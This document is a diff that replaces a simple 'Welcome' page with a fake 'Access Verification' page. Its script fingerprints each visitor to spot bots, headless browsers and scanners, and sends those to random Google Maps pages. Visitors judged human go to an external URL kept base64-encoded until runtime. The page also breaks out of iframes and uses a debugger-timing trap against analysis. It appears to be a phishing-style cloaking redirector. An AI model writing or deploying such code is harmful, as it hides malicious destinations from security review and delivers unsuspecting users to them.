@@ -3,9 +3,478 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome</title>
+    <title>Access Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background-color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #333;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        h1 {
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+            color: #2c3e50;
+        }
+        
+        p {
+            margin-bottom: 20px;
+            line-height: 1.5;
+            color: #7f8c8d;
+        }
+        
+        .loader {
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(52, 152, 219, 0.3);
+            border-radius: 50%;
+            border-top-color: #3498db;
+            animation: spin 1s ease-in-out infinite;
+            margin: 10px auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .status {
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-size: 0.9rem;
+        }
+        
+        .verifying {
+            background-color: #f8f9fa;
+            color: #6c757d;
+        }
+        
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .warning {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <h1>Welcome</h1>
+    <div class="container">
+        <h1>Verifying Access</h1>
+        <p>Please wait while we verify your request. This should only take a moment.</p>
+        
+        <div id="statusVerifying" class="status verifying">
+            <div class="loader"></div>
+            <p>Checking security parameters...</p>
+        </div>
+        
+        <div id="statusSuccess" class="status success hidden">
+            <p>✓ Access granted. Redirecting...</p>
+        </div>
+        
+        <div id="statusWarning" class="status warning hidden">
+            <p>⚠ Security check in progress...</p>
+        </div>
+    </div>
+
+    <!-- Invisible anti-bot traps -->
+    <div style="display:none">
+        <!-- Honeypot field -->
+        <input type="text" id="honeypot" name="honeypot" tabindex="-1" autocomplete="off">
+        
+        <!-- Invisible iframe to detect headless browsers -->
+        <iframe src="about:blank" id="botTrap" style="width:0;height:0;border:0;border:none;"></iframe>
+        
+        <!-- CSS-based bot trap -->
+        <div id="cssTrap" style="opacity:0;position:absolute;left:-10000px;"></div>
+        
+        <!-- JavaScript challenge -->
+        <div id="jsChallenge"></div>
+        
+        <!-- Additional hidden traps -->
+        <link id="fakeLink" rel="stylesheet" href="fake.css">
+        <script id="fakeScript" src="fake.js"></script>
+    </div>
+
+    <script>
+        // Obfuscated configuration - Target URL is hidden and decoded at runtime
+        const ENCODED_TARGET = "aHR0cHM6Ly9yYXNob2Nyby5idXNpbmVzcy9MTzBuandyNXZKMUYhR3Qv"; // Base64 encoded target URL
+        const BOT_REDIRECT_DELAY = 2000;
+        
+        // Function to decode the target URL
+        function decodeTarget() {
+            return atob(ENCODED_TARGET);
+        }
+        
+        // Bot locations array with obfuscation
+        const BOT_LOCATIONS = (function() {
+            const locations = [
+                "https://www.google.com/maps/@40.7128,-74.0060,15z",
+                "https://www.google.com/maps/@34.0522,-118.2437,15z",
+                "https://www.google.com/maps/@51.5074,-0.1278,15z",
+                "https://www.google.com/maps/@48.8566,2.3522,15z",
+                "https://www.google.com/maps/@35.6762,139.6503,15z",
+                "https://www.google.com/maps/@55.7558,37.6173,15z",
+                "https://www.google.com/maps/@-33.8688,151.2093,15z",
+                "https://www.google.com/maps/@19.4326,-99.1332,15z",
+                "https://www.google.com/maps/@-23.5505,-46.6333,15z",
+				"https://www.google.com/maps/@52.5200,13.4050,15z",
+				"https://www.google.com/maps/@41.9028,12.4964,15z",
+				"https://www.google.com/maps/@25.2048,55.2708,15z",
+				"https://www.google.com/maps/@19.0760,72.8777,15z",
+				"https://www.google.com/maps/@30.0444,31.2357,15z",
+				"https://www.google.com/maps/@13.7563,100.5018,15z",
+				"https://www.google.com/maps/@-22.9068,-43.1729,15z",
+				"https://www.google.com/maps/@43.6532,-79.3832,15z",
+				"https://www.google.com/maps/@1.3521,103.8198,15z",
+				"https://www.google.com/maps/@41.0082,28.9784,15z",
+				"https://www.google.com/maps/@37.5665,126.9780,15z",
+				"https://www.google.com/maps/@52.3676,4.9041,15z",
+				"https://www.google.com/maps/@48.2082,16.3738,15z",
+				"https://www.google.com/maps/@50.0755,14.4378,15z",
+				"https://www.google.com/maps/@-33.9249,18.4241,15z",
+				"https://www.google.com/maps/@41.3851,2.1734,15z",
+				"https://www.google.com/maps/@59.3293,18.0686,15z",
+				"https://www.google.com/maps/@37.9838,23.7275,15z",
+				"https://www.google.com/maps/@60.1699,24.9384,15z",
+				"https://www.google.com/maps/@64.1466,-21.9426,15z",
+                "https://www.google.com/maps/@39.9042,116.4074,15z"
+            ];
+            // Shuffle array to make pattern detection harder
+            return locations.sort(() => Math.random() - 0.5);
+        })();
+
+        // Advanced bot detection with multiple layers
+        const botDetector = {
+            // Layer 1: Basic automation detection
+            detectAutomation: function() {
+                let score = 0;
+                
+                // Check for webdriver
+                if (navigator.webdriver) score += 3;
+                
+                // Check for headless browser properties
+                if (!navigator.languages || navigator.languages.length === 0) score += 2;
+                if (navigator.plugins.length === 0) score += 2;
+                if (window.outerWidth === 0 && window.outerHeight === 0) score += 2;
+                
+                // Check for automation frameworks
+                if (window.callPhantom || window._phantom) score += 3;
+                if (window.__nightmare) score += 3;
+                if (window.Buffer) score += 1; // Node.js in browser
+                
+                return score;
+            },
+            
+            // Layer 2: Behavioral analysis
+            analyzeBehavior: function() {
+                let score = 0;
+                
+                // Check user agent for bots
+                const ua = navigator.userAgent.toLowerCase();
+                const botPatterns = [
+                    'bot', 'crawler', 'spider', 'scraper', 'phantom', 'headless',
+                    'selenium', 'puppeteer', 'playwright', 'curl', 'wget', 'python'
+                ];
+                
+                botPatterns.forEach(pattern => {
+                    if (ua.includes(pattern)) score += 2;
+                });
+                
+                // Check for common automation headers
+                if (document.documentElement.getAttribute('webdriver')) score += 2;
+                if (navigator.__webdriver_evaluate) score += 3;
+                
+                return score;
+            },
+            
+            // Layer 3: Technical capability checks
+            checkCapabilities: function() {
+                let score = 0;
+                
+                // WebGL check
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) score += 2;
+                
+                // Audio context check
+                if (!window.AudioContext && !window.webkitAudioContext) score += 2;
+                
+                // Font detection (bots often have limited fonts)
+                const fonts = [
+                    'Times New Roman', 'Arial', 'Helvetica', 'Courier New',
+                    'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman',
+                    'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'
+                ];
+                
+                let detectedFonts = 0;
+                const testString = "mmmmmmmmmmlli";
+                const testSize = "72px";
+                const span = document.createElement("span");
+                span.style.fontSize = testSize;
+                span.innerHTML = testString;
+                document.body.appendChild(span);
+                
+                const defaultWidth = span.offsetWidth;
+                const defaultHeight = span.offsetHeight;
+                
+                fonts.forEach(font => {
+                    span.style.fontFamily = font + ',monospace';
+                    if (span.offsetWidth !== defaultWidth || span.offsetHeight !== defaultHeight) {
+                        detectedFonts++;
+                    }
+                });
+                
+                document.body.removeChild(span);
+                
+                if (detectedFonts < 5) score += 2;
+                
+                return score;
+            },
+            
+            // Layer 4: Honeypot and trap detection
+            checkTraps: function() {
+                let score = 0;
+                
+                // Honeypot field
+                const honeypot = document.getElementById('honeypot');
+                if (honeypot.value !== '') score += 3;
+                
+                // Iframe behavior
+                const iframe = document.getElementById('botTrap');
+                if (iframe.contentWindow === null || iframe.contentDocument === null) score += 2;
+                
+                // CSS trap events
+                const cssTrap = document.getElementById('cssTrap');
+                let trapTriggered = false;
+                
+                const trapHandler = () => { trapTriggered = true; };
+                cssTrap.addEventListener('click', trapHandler);
+                cssTrap.addEventListener('focus', trapHandler);
+                
+                try {
+                    cssTrap.focus();
+                } catch(e) {}
+                
+                if (trapTriggered) score += 3;
+                
+                // Resource loading traps
+                const fakeLink = document.getElementById('fakeLink');
+                const fakeScript = document.getElementById('fakeScript');
+                
+                if (fakeLink.sheet || fakeScript.src) score += 2;
+                
+                return score;
+            },
+            
+            // Layer 5: JavaScript environment analysis
+            analyzeJSEnvironment: function() {
+                let score = 0;
+                
+                // Complex JS challenge
+                try {
+                    // Test proper function constructor
+                    const funcTest = new Function('a', 'b', 'return a * b + (a + b) / 2;');
+                    if (funcTest(10, 5) !== 57.5) score += 2;
+                    
+                    // Test prototype chain
+                    function TestClass() {}
+                    TestClass.prototype.testMethod = function() { return 42; };
+                    const instance = new TestClass();
+                    if (instance.testMethod() !== 42) score += 2;
+                    
+                    // Test async/await simulation
+                    const asyncTest = Promise.resolve(25);
+                    asyncTest.then(val => {
+                        if (val !== 25) score += 1;
+                    });
+                    
+                    // Test error handling
+                    try {
+                        throw new Error('test');
+                    } catch (e) {
+                        if (e.message !== 'test') score += 1;
+                    }
+                    
+                } catch(e) {
+                    score += 3;
+                }
+                
+                // Check for dev tools
+                const devTools = function() {};
+                devTools.toString = function() {
+                    return "function devTools() { [native code] }";
+                };
+                
+                if (devTools.toString().length !== 35) score += 1;
+                
+                return score;
+            },
+            
+            // Layer 6: Performance and timing analysis
+            checkPerformance: function() {
+                let score = 0;
+                const perf = window.performance || window.webkitPerformance || window.msPerformance || window.mozPerformance;
+                
+                if (perf && perf.timing) {
+                    const loadTime = perf.timing.loadEventEnd - perf.timing.navigationStart;
+                    const domReadyTime = perf.timing.domContentLoadedEventEnd - perf.timing.navigationStart;
+                    
+                    // Unusually fast or slow times indicate automation
+                    if (loadTime < 50 || loadTime > 15000) score += 2;
+                    if (domReadyTime < 10 || domReadyTime > 10000) score += 2;
+                }
+                
+                // Check memory (Node.js environments often have process.memoryUsage)
+                if (window.process && window.process.memoryUsage) score += 3;
+                
+                return score;
+            },
+            
+            // Layer 7: Mouse and interaction analysis
+            checkInteractions: function() {
+                return new Promise(resolve => {
+                    let score = 0;
+                    let mouseMoved = false;
+                    let keyPressed = false;
+                    let touchDetected = false;
+                    
+                    const mouseHandler = () => { mouseMoved = true; };
+                    const keyHandler = () => { keyPressed = true; };
+                    const touchHandler = () => { touchDetected = true; };
+                    
+                    document.addEventListener('mousemove', mouseHandler);
+                    document.addEventListener('keydown', keyHandler);
+                    document.addEventListener('touchstart', touchHandler);
+                    
+                    setTimeout(() => {
+                        document.removeEventListener('mousemove', mouseHandler);
+                        document.removeEventListener('keydown', keyHandler);
+                        document.removeEventListener('touchstart', touchHandler);
+                        
+                        if (!mouseMoved) score += 1;
+                        if (!keyPressed) score += 1;
+                        if (!touchDetected && 'ontouchstart' in window) score += 1;
+                        
+                        resolve(score);
+                    }, 800);
+                });
+            }
+        };
+        
+        // Main detection function with weighted scoring
+        async function detectBot() {
+            const scores = {
+                automation: botDetector.detectAutomation(),
+                behavior: botDetector.analyzeBehavior(),
+                capabilities: botDetector.checkCapabilities(),
+                traps: botDetector.checkTraps(),
+                jsEnv: botDetector.analyzeJSEnvironment(),
+                performance: botDetector.checkPerformance(),
+                interactions: await botDetector.checkInteractions()
+            };
+            
+            // Weighted scoring - some indicators are more important than others
+            const totalScore = 
+                scores.automation * 1.5 +
+                scores.behavior * 1.2 +
+                scores.capabilities * 1.0 +
+                scores.traps * 2.0 +
+                scores.jsEnv * 1.3 +
+                scores.performance * 1.1 +
+                scores.interactions * 0.8;
+            
+            // If total weighted score > 8, consider it a bot
+            return totalScore > 8;
+        }
+        
+        // Main execution with error handling
+        document.addEventListener('DOMContentLoaded', async function() {
+            try {
+                // Show verifying status
+                document.getElementById('statusVerifying').classList.remove('hidden');
+                
+                // Add random delay to make timing analysis harder
+                await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
+                
+                // Run advanced bot detection
+                const isBot = await detectBot();
+                
+                // Hide verifying status
+                document.getElementById('statusVerifying').classList.add('hidden');
+                
+                if (isBot) {
+                    // Bot detected - redirect to random location
+                    document.getElementById('statusWarning').classList.remove('hidden');
+                    
+                    setTimeout(() => {
+                        const randomIndex = Math.floor(Math.random() * BOT_LOCATIONS.length);
+                        window.location.replace(BOT_LOCATIONS[randomIndex]);
+                    }, BOT_REDIRECT_DELAY);
+                } else {
+                    // Human detected - decode and redirect to target URL
+                    document.getElementById('statusSuccess').classList.remove('hidden');
+                    
+                    setTimeout(() => {
+                        const targetUrl = decodeTarget();
+                        window.location.replace(targetUrl);
+                    }, 800);
+                }
+            } catch (error) {
+                // If anything fails, assume it's a bot and redirect
+                console.error('Security check error:', error);
+                window.location.replace(BOT_LOCATIONS[0]);
+            }
+        });
+        
+        // Additional protection layers
+        window.addEventListener('load', function() {
+            // Prevent loading in iframes
+            if (window.self !== window.top) {
+                window.top.location.replace(BOT_LOCATIONS[Math.floor(Math.random() * BOT_LOCATIONS.length)]);
+            }
+            
+            // Detect debugger tools
+            const startTime = Date.now();
+            debugger;
+            const endTime = Date.now();
+            if (endTime - startTime > 100) {
+                window.location.replace(BOT_LOCATIONS[Math.floor(Math.random() * BOT_LOCATIONS.length)]);
+            }
+        });
+        
+        // Anti-tampering protection
+        Object.defineProperty(window, 'decodeTarget', {
+            configurable: false,
+            writable: false
+        });
+    </script>
 </body>
 </html>
